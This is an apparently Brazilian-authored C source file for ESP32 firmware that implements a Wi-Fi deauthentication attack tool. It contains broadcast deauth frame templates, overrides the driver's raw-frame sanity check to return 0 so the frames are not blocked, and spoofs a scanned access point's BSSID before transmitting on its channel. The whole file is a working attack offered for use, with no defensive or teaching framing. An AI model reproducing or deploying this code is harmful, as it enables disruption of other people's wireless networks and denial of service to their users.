#include "wifi_deauther.h"
#include "freertos/projdefs.h"
#include "esp_wifi.h"
#include "freertos/task.h"
#include "led_control.h"
#include "esp_log.h"// Certifique-se que este arquivo contém o ícone 'wifi_main'
#include <string.h>

// =================================================================
// Definições e Variáveis Globais
// =================================================================
static const char *TAG = "wifi";

wifi_ap_record_t stored_aps[WIFI_SCAN_LIST_SIZE];
uint16_t stored_ap_count = 0;

// Armazena os resultados do último scan
// #define WIFI_SCAN_LIST_SIZE 15
// static wifi_ap_record_t stored_aps[WIFI_SCAN_LIST_SIZE];
// static uint16_t stored_ap_count = 0;

static const uint8_t deauth_frame_invalid_auth[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const uint8_t deauth_frame_inactivity[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x04, 0x00
};

static const uint8_t deauth_frame_class3[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x07, 0x00
};

static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
    switch (type) {
        case DEAUTH_INVALID_AUTH:
            return deauth_frame_invalid_auth;
        case DEAUTH_INACTIVITY:
            return deauth_frame_inactivity;
        case DEAUTH_CLASS3:
            return deauth_frame_class3;
        default:
            return deauth_frame_invalid_auth;
    }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOGD(TAG, "Tentando enviar frame bruto de tamanho %d", size);
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao enviar frame bruto: %s (0x%x)", esp_err_to_name(ret), ret);
        led_blink_red();
    } else {
        ESP_LOGI(TAG, "Frame bruto enviado com sucesso");
        led_blink_green();
    }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
                           (type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
    ESP_LOGD(TAG, "Preparando frame de deauth (%s) para %s no canal %d", type_str, ap_record->ssid, ap_record->primary);
    ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    const uint8_t *frame_template = get_deauth_frame_template(type);
    uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
    memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID

    ESP_LOGD(TAG, "Mudando para canal %d", ap_record->primary);
    esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao definir canal %d: %s", ap_record->primary, esp_err_to_name(ret));
        led_blink_red();
        return;
    }

    ESP_LOGD(TAG, "Enviando frame de deauth");
    wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
}

// uint16_t get_stored_ap_count(void) {
//     return stored_ap_count;
// }
//
// const wifi_ap_record_t* get_stored_ap_record(int index) {
//     if (index >= 0 && index < stored_ap_count) {
//         return &stored_aps[index];
//     }
//     return NULL;
// }
